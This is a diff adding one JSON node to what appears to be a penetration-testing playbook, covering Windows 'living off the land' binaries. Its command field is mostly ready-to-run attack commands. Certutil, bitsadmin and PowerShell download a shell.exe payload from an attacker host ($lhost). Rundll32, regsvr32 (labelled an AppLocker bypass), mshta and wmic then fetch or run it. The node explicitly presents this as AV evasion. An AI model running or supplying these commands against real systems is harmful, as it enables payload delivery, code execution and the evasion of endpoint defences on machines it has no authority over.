@@ -1,0 +1,18 @@
+{
+  "id": "lolbins",
+  "phase": "WINDOWS",
+  "title": "LOLBins — Living Off The Land",
+  "body": "Use Windows built-in binaries to avoid dropping tools. Useful for AV evasion and restricted environments. Reference: lolbas-project.github.io",
+  "cmd": "# ── FILE TRANSFER ────────────────────────────────────\n# certutil — download file\ncertutil -urlcache -split -f http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe\n\n# bitsadmin\nbitsadmin /transfer job http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe\n\n# powershell\n(New-Object Net.WebClient).DownloadFile(\"http://$lhost/shell.exe\",\"C:\\Windows\\Temp\\shell.exe\")\niwr http://$lhost/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe\n\n# ── CODE EXECUTION ────────────────────────────────────\n# rundll32\nrundll32 shell32.dll,ShellExec_RunDLL C:\\Windows\\Temp\\shell.exe\n\n# regsvr32 (AppLocker bypass)\nregsvr32 /s /n /u /i:http://$lhost/shell.sct scrobj.dll\n\n# mshta\nmshta http://$lhost/shell.hta\n\n# wmic\nwmic process call create \"C:\\Windows\\Temp\\shell.exe\"\n\n# ── UAC BYPASS ────────────────────────────────────────\n# iscsicpl.exe — auto-elevated, PATH hijack\n# See win_uac_bypass node for full workflow\n\n# ── REFERENCE ─────────────────────────────────────────\n# lolbas-project.github.io — full list with examples\n# GTFOBins Windows equivalent",
+  "warn": null,
+  "choices": [
+    {
+      "label": "UAC bypass via LOLBin",
+      "next": "win_uac_bypass"
+    },
+    {
+      "label": "Back to Windows privesc",
+      "next": "windows_post_exploit"
+    }
+  ]
+}
